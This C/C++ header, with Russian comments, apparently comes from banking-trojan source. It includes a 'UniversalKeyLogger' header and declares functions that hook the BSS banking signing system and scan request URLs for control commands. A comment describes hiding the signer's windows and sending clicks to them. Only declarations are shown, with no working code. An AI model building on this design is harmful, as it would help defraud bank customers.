#ifndef bsssignH
#define bsssignH



#include <windows.h>
#include <wininet.h>
#include "UniversalKeyLogger.h"


// здесь отлавливаються нужные окна для яваскрипта и хайдяться. туда посылаються клики, либо же нажимаються кнопки
//void IsBsssign(HINTERNET hRequest);

//***********************************************************************
//  методы BSSSign
//***********************************************************************
namespace BSSSign
{
	//------------------------------------------
	// Функция инициализирует систему
	// подписи BSS
	//------------------------------------------
	void Initialize();

	//------------------------------------------
	//  Функция проверяет запрос на предмет
	//  адрес запроса на предмет наличия в нём
	//  команды управления
	//------------------------------------------
	void CheckRequest(PCHAR URL);


}

#endif